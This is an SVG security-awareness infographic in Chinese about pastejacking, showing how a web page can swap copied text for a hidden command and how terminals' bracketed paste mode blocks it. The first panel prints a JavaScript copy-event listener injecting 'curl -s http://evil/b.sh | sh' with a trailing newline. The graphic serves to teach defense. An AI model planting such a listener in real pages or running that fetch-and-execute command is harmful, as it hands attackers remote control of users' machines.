<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1400 700" width="1400" height="700">
  <defs>
    <linearGradient id="bg5" x1="0%" y1="0%" x2="100%" y2="100%">
      <stop offset="0%" stop-color="#150a0a"/>
      <stop offset="100%" stop-color="#1f1111"/>
    </linearGradient>
  </defs>

  <rect width="1400" height="700" fill="url(#bg5)"/>

  <text x="700" y="50" text-anchor="middle" font-family="-apple-system, BlinkMacSystemFont, sans-serif" font-size="30" font-weight="800" fill="#f8fafc">恶意剪贴板劫持 (Pastejacking) 攻击链与终端防御</text>
  <text x="700" y="85" text-anchor="middle" font-family="sans-serif" font-size="16" fill="#fca5a5">为什么在不信任网页复制代码直接粘贴进终端，可能会导致电脑被黑客远程控制？</text>

  <!-- Step 1: Deceptive Webpage -->
  <g transform="translate(80, 130)">
    <rect width="360" height="520" rx="16" fill="#1c1917" stroke="#ea580c" stroke-width="2"/>
    <text x="180" y="40" text-anchor="middle" font-family="sans-serif" font-size="20" font-weight="800" fill="#fb923c">【第 1 步：欺诈网页】</text>
    <text x="180" y="65" text-anchor="middle" font-family="sans-serif" font-size="14" fill="#fed7aa">表面看起来人畜无害的代码</text>

    <rect x="25" y="90" width="310" height="140" rx="8" fill="#0c0a09" stroke="#44403c"/>
    <text x="40" y="120" font-family="sans-serif" font-size="14" font-weight="700" fill="#f8fafc">肉眼可见的网页文本：</text>
    <rect x="40" y="135" width="280" height="40" rx="6" fill="#1c1917"/>
    <text x="50" y="160" font-family="monospace" font-size="13" fill="#86efac">git clone https://demo.git</text>
    <text x="40" y="200" font-family="sans-serif" font-size="12" fill="#94a3b8">小学生或小白以为只复制了下载命令</text>

    <!-- Malicious JS Trap -->
    <rect x="25" y="250" width="310" height="230" rx="8" fill="#450a0a" stroke="#dc2626"/>
    <text x="40" y="280" font-family="sans-serif" font-size="15" font-weight="700" fill="#fca5a5">【暗藏恶意 JS 监听器】</text>
    <text x="40" y="310" font-family="monospace" font-size="11" fill="#cbd5e1">document.addEventListener('copy', (e) => {</text>
    <text x="55" y="330" font-family="monospace" font-size="11" fill="#fca5a5">  e.clipboardData.setData('text/plain',</text>
    <text x="55" y="350" font-family="monospace" font-size="11" fill="#ef4444">    'curl -s http://evil/b.sh | sh \n');</text>
    <text x="55" y="370" font-family="monospace" font-size="11" fill="#cbd5e1">  e.preventDefault();</text>
    <text x="40" y="390" font-family="monospace" font-size="11" fill="#cbd5e1">});</text>
    <text x="40" y="430" font-family="sans-serif" font-size="13" font-weight="700" fill="#f87171">★ 致命暗桩：注入隐藏回车符 (\n)</text>
    <text x="40" y="455" font-family="sans-serif" font-size="12" fill="#fecaca">一旦粘贴，立刻自动触发执行！</text>
  </g>

  <!-- Step 2: Unprotected Terminal (Disaster) -->
  <g transform="translate(480, 130)">
    <rect width="400" height="520" rx="16" fill="#260f12" stroke="#ef4444" stroke-width="2.5"/>
    <text x="200" y="40" text-anchor="middle" font-family="sans-serif" font-size="20" font-weight="800" fill="#f87171">【无防备终端：瞬间中招】</text>
    <text x="200" y="65" text-anchor="middle" font-family="sans-serif" font-size="14" fill="#fca5a5">未开启括号粘贴或直接在 root 执行</text>

    <rect x="25" y="90" width="350" height="380" rx="10" fill="#0f0506" stroke="#b91c1c"/>
    <text x="45" y="125" font-family="monospace" font-size="13" fill="#f87171">$ # 用户按下 Ctrl+V 或右键粘贴</text>
    
    <rect x="40" y="145" width="320" height="55" rx="6" fill="#450a0a"/>
    <text x="50" y="170" font-family="monospace" font-size="12" fill="#fca5a5">curl -s http://evil/b.sh | sh [ENTER]</text>
    <text x="50" y="190" font-family="sans-serif" font-size="11" fill="#ef4444">隐藏回车符自动按下！无需用户确认！</text>

    <text x="45" y="235" font-family="monospace" font-size="13" fill="#fca5a5">[MALICIOUS PAYLOAD RUNNING...]</text>
    <text x="45" y="265" font-family="monospace" font-size="12" fill="#cbd5e1">Downloading backdoor script...</text>
    <text x="45" y="290" font-family="monospace" font-size="12" fill="#ef4444">Writing SSH authorized_keys...</text>
    <text x="45" y="315" font-family="monospace" font-size="12" fill="#ef4444">Exfiltrating browser cookies...</text>
    <text x="45" y="345" font-family="monospace" font-size="13" fill="#f87171">[CRITICAL] Root Shell Compromised!</text>

    <rect x="40" y="380" width="320" height="70" rx="6" fill="#2d0f12"/>
    <text x="200" y="410" text-anchor="middle" font-family="sans-serif" font-size="13" font-weight="700" fill="#f87171">惨痛后果：服务器被植入勒索木马</text>
    <text x="200" y="435" text-anchor="middle" font-family="sans-serif" font-size="12" fill="#fca5a5">连按 Ctrl+C 终止的机会都没有！</text>
  </g>

  <!-- Step 3: Modern Terminal Defense -->
  <g transform="translate(920, 130)">
    <rect width="400" height="520" rx="16" fill="#064e3b" stroke="#10b981" stroke-width="2.5"/>
    <text x="200" y="40" text-anchor="middle" font-family="sans-serif" font-size="20" font-weight="800" fill="#34d399">【现代终端：括号粘贴防御】</text>
    <text x="200" y="65" text-anchor="middle" font-family="sans-serif" font-size="14" fill="#a7f3d0">Bracketed Paste Mode 自动防护机制</text>

    <rect x="25" y="90" width="350" height="380" rx="10" fill="#03251c" stroke="#059669"/>
    <text x="45" y="125" font-family="monospace" font-size="13" fill="#34d399">$ # 现代终端包裹特殊转义序列</text>
    <text x="45" y="150" font-family="monospace" font-size="12" fill="#6ee7b7">\e[200~ (开始粘贴标记)</text>

    <rect x="40" y="170" width="320" height="90" rx="6" fill="#065f46" stroke="#34d399"/>
    <text x="50" y="195" font-family="sans-serif" font-size="13" font-weight="700" fill="#ffffff">★ 终端弹窗警告并拦截自动回车：</text>
    <text x="50" y="220" font-family="sans-serif" font-size="12" fill="#a7f3d0">“检测到粘贴内容包含换行与多行命令”</text>
    <text x="50" y="240" font-family="sans-serif" font-size="12" fill="#6ee7b7">“回车符被转义，绝对不会自动执行！”</text>

    <text x="45" y="285" font-family="monospace" font-size="12" fill="#6ee7b7">\e[201~ (结束粘贴标记)</text>

    <text x="45" y="325" font-family="sans-serif" font-size="13" font-weight="700" fill="#86efac">安全口诀与极客法则：</text>
    <text x="45" y="355" font-family="sans-serif" font-size="12" fill="#cbd5e1">1. 陌生网站命令先粘进【记事本】看一眼</text>
    <text x="45" y="380" font-family="sans-serif" font-size="12" fill="#cbd5e1">2. 永远不要无脑盲粘到 root 终端</text>
    <text x="45" y="405" font-family="sans-serif" font-size="12" fill="#cbd5e1">3. 使用自动化检测脚本一键预检剪贴板</text>

    <rect x="40" y="430" width="320" height="30" rx="4" fill="#047857"/>
    <text x="200" y="450" text-anchor="middle" font-family="sans-serif" font-size="12" font-weight="700" fill="#ffffff">✓ 恶意脚本现出原形，被安全扼杀</text>
  </g>
</svg>